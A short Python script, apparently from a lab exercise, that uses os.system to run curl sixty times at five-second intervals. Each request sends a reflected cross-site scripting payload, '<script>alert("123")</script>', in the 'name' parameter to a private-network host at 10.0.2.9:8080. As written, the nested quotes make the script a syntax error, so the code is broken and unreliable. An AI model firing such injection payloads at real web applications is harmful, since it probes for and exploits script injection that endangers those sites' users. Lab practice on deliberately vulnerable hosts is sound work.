import os
import time

n=60

while n:
    os.system("curl http://10.0.2.9:8080?name=<script>alert("123")</script> ")
    time.sleep(5)
    n=n-1